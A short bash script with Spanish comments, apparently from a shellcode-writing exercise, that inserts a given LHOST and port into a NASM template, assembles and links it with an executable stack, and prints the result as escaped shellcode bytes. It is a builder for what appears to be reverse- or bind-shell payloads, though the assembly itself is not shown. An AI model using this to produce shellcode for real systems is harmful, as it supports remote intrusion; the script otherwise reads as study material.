#!/bin/bash

if [ -z $3 ]; then
	echo "Usage ./compile.sh FILENAME LHOST PORT"
else
	if [ $3 -gt 65535 ] || [ 1025 -gt $3 ]; then 
		echo "Port must be between 1025 and 65535!"
	else
		#./compile.sh bind_shell 8888
		cp schema.nasm $1.nasm #Creamos el nasm para no cargarnos el esquema 

		echo "[+] Inserting host and port to code..." #Partimos la ip y la pasamos a hexadecimal 
		IP_1=`echo $2 | cut -d. -f1`
		IP_2=`echo $2 | cut -d. -f2`
		IP_3=`echo $2 | cut -d. -f3`
		IP_4=`echo $2 | cut -d. -f4`
		IP1=`python -c "import struct; print struct.pack('<L',$IP_1).encode('hex')[:2]"`
		IP2=`python -c "import struct; print struct.pack('<L',$IP_2).encode('hex')[:2]"`
		IP3=`python -c "import struct; print struct.pack('<L',$IP_3).encode('hex')[:2]"`
		IP4=`python -c "import struct; print struct.pack('<L',$IP_4).encode('hex')[:2]"`
		HEX_HOST=0x$IP4$IP3$IP2$IP1
		HEX_PORT=0x`python -c "import struct; print struct.pack('<L',$3).encode('hex')[:4]"`0002 #Aqui usamos python para pasar el puerto a hexadecimal bien. Solo cambian 4 bytes, lo otro es fijo
		replace "LOCALPORT" "$HEX_PORT" -- $1.nasm  #cambia la palabra puerto por el puerto en hexadecimal
		replace "LOCALHOST" "$HEX_HOST" -- $1.nasm #cambia el host
		echo '[+] Assembling with Nasm ... '
		nasm -f elf32 -o $1.o $1.nasm

		echo '[+] Linking ...'
		ld -z execstack -o $1 $1.o

		echo '[+] Done!'
		echo
		#rm $1.nasm #Eliminamos lo creado
		rm $1.o

		echo "[+] Shellcode ($2,$3) is..."
		echo 
		objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
	fi
fi
